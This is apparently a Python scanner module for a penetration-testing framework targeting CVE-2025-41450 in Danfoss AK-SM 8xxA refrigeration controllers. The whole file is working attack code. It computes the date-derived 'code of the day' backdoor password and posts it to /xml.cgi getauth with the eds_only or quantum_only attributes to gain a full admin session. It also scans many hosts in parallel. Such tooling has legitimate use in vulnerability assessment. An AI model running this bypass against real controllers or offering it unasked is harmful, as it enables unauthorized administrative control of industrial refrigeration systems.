import http.cookiejar
import re
import ssl
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar

DEFAULT_ATTRS = "eds_only,quantum_only"

def code_of_day(year, month, day):
    year2 = year % 100
    x = int("%02d%02d%02d%02d" % (month, day, year2, month), 16)
    y = int("%02d" % day, 16)
    return "%05d" % ((x // y) % 100000)


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    code: str = ""
    attr: str = ""


class DanfossCodtScanner(Auxiliary):
    NAME = "Danfoss AK-SM 8xxA Code-of-the-Day Auth Bypass Scanner (CVE-2025-41450)"
    DESCRIPTION = (
        "Detects the hidden code-of-the-day authentication bypass in Danfoss "
        "AK-SM 8xxA refrigeration controllers. The controller accepts a "
        "date-derived password on /xml.cgi?action=getauth when the eds_only "
        "or quantum_only attribute is set, granting a full admin session "
        "(0xffffff permission bits) without knowing the configured "
        "credentials. Affects firmware prior to R4.2. The check reads the "
        "device date, computes the code of the day, and attempts "
        "authentication."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "excellent"
    DISCLOSED = "2025-05-20"
    CHECK = True
    REFERENCES = [
        "CVE-2025-41450",
        "https://nvd.nist.gov/vuln/detail/CVE-2025-41450",
        "https://blog.claroty.com/team82/research/freeze-the-controller-defrost-the-food-uncovering-vulnerabilities-in-danfoss-refrigeration-controllers",
        "https://github.com/Nero22k/CVE-2025-41450_poc",
        "https://github.com/msuiche/fromagegate",
        "https://www.synacktiv.com/sites/default/files/2023-05/Synacktiv-Danfoss-Storeview-Web-Auth-Bypass.pdf",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=80, type=int, description="HTTP port"),
        Option("SSL", default=False, type=bool, description="use HTTPS"),
        Option("ATTRS", default=DEFAULT_ATTRS,
               description="bypass attribute names to try (comma-separated)"),
        Option("DEVICE_DATE", default="",
               description="override device date YYYY-MM-DD (blank = read from device)"),
        Option("TIMEOUT", default=10.0, type=float, description="per-request timeout"),
        Option("THREADS", default=25, type=int, description="concurrent workers"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first vulnerable host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _attr_list(self):
        return [a.strip() for a in self.options["ATTRS"].split(",") if a.strip()]

    def _base(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _opener(self):
        ctx = ssl._create_unverified_context()
        jar = http.cookiejar.CookieJar()
        return urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(jar),
            urllib.request.HTTPSHandler(context=ctx),
        )

    def _get(self, opener, host, path):
        url = self._base(host) + path
        req = urllib.request.Request(url)
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        try:
            with opener.open(req, timeout=self.options["TIMEOUT"]) as r:
                return r.status, r.read().decode(errors="replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace"), e.headers

    def _post_form(self, opener, host, body, ctype):
        url = self._base(host) + "/xml.cgi"
        req = urllib.request.Request(url, data=body, method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Content-Type", ctype)
        req.add_header("Accept", "application/json, text/plain, */*")
        try:
            with opener.open(req, timeout=self.options["TIMEOUT"]) as r:
                return r.status, r.read().decode(errors="replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace"), e.headers

    def _post_xml_param(self, opener, host, xml_body, ctype):
        body = ("xml=" + urllib.parse.quote(xml_body, safe="")).encode()
        return self._post_form(opener, host, body, ctype)

    def _post_query(self, opener, host, params):
        url = self._base(host) + "/xml.cgi?" + urllib.parse.urlencode(params)
        req = urllib.request.Request(url, data=b"", method="POST")
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        req.add_header("Content-Type", "text/plain")
        try:
            with opener.open(req, timeout=self.options["TIMEOUT"]) as r:
                return r.status, r.read().decode(errors="replace"), r.headers
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="replace"), e.headers

    def _fingerprint(self, opener, host):
        try:
            st, body, _ = self._get(opener, host, "/")
        except urllib.error.URLError:
            return False, ""
        if st != 200:
            return False, ""
        blob = body.lower()
        if "storeview" in blob or "ak-sm" in blob or "aksm" in blob:
            m = re.search(r"AK-SM\s*([0-9]+A?)", body, re.I)
            version = m.group(1) if m else ""
            return True, version
        return False, ""

    def _read_device_date(self, opener, host):
        override = self.options["DEVICE_DATE"].strip()
        if override:
            try:
                dt = datetime.strptime(override, "%Y-%m-%d")
                return dt.year, dt.month, dt.day, "override"
            except ValueError:
                pass

        for ctype in ("text/plain", "application/x-www-form-urlencoded"):
            try:
                st, body, _ = self._post_xml_param(opener, host, "", ctype)
            except urllib.error.URLError:
                continue
            if st != 200:
                continue
            ym = re.search(r"<year>(\d+)</year>", body)
            mm = re.search(r"<month>(\d+)</month>", body)
            dm = re.search(r"<day>(\d+)</day>", body)
            if ym and mm and dm:
                return int(ym.group(1)), int(mm.group(1)), int(dm.group(1)), "device"

        now = datetime.now()
        return now.year, now.month, now.day, "local"

    def _candidate_codes(self, year, month, day):
        base = datetime(year, month, day)
        codes = []
        for delta in (0, -1, 1):
            d = base + timedelta(days=delta)
            codes.append(code_of_day(d.year, d.month, d.day))
        return list(dict.fromkeys(codes))

    def _looks_authenticated(self, body, headers):
        cookies = headers.get_all("Set-Cookie") or []
        cookie_str = " ".join(cookies)
        has_session = "SMSession=" in cookie_str
        tm = re.search(r"<authtype>(\d+)</authtype>", body)
        am = re.search(r"<accesslevel>(\d+)</accesslevel>", body)
        if tm and tm.group(1) == "16777215":
            return True
        if has_session and am and am.group(1) == "1":
            return True
        if has_session and "<ok" in body.lower():
            return True
        return False

    def _try_getauth(self, opener, host, attr, code):
        xml = '<getauth ' + attr + '="1" password="' + code + '"/>'
        attempts = [
            lambda: self._post_xml_param(opener, host, xml, "text/plain"),
            lambda: self._post_xml_param(opener, host, xml, "application/x-www-form-urlencoded"),
            lambda: self._post_query(opener, host,
                {"action": "getauth", attr: "1", "password": code, "username": "admin"}),
        ]
        saw_failure = False
        for fn in attempts:
            try:
                st, body, headers = fn()
            except urllib.error.URLError:
                continue
            if self._looks_authenticated(body, headers):
                return True, body
            if "authentication failed" in body.lower():
                saw_failure = True
        if saw_failure:
            return False, "authentication failed"
        return None, ""

    def _probe(self, host):
        result = HostResult(host=host)
        opener = self._opener()

        is_danfoss, version = self._fingerprint(opener, host)
        if not is_danfoss:
            result.state = "safe"
            result.detail = "not Danfoss AK-SM"
            return result

        year, month, day, source = self._read_device_date(opener, host)
        if source == "device":
            result.detail = "device date %04d-%02d-%02d" % (year, month, day)
        elif source == "override":
            result.detail = "override date %04d-%02d-%02d" % (year, month, day)

        codes = self._candidate_codes(year, month, day)
        result.code = codes[0]

        saw_failure = False
        for attr in self._attr_list():
            for code in codes:
                try:
                    ok, body = self._try_getauth(opener, host, attr, code)
                except urllib.error.URLError as e:
                    result.state = "unknown"
                    result.detail = "connection failed (" + type(e).__name__ + ")"
                    return result
                if ok:
                    result.state = "vulnerable"
                    result.attr = attr
                    result.code = code
                    detail = "auth bypass via " + attr + " (code " + code + ")"
                    if version:
                        detail += " | AK-SM " + version
                    result.detail = detail
                    return result
                if body:
                    saw_failure = True

        if saw_failure:
            result.state = "safe"
            result.detail = "auth rejected (patched or code mismatch)"
            return result

        result.state = "unknown"
        result.detail = "no conclusive response"
        return result

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base(host)))
        print(colors.dimmed("  path: /xml.cgi?action=getauth"))

        r = self._probe(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " - " + r.detail))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._probe, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.yellow(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return hits
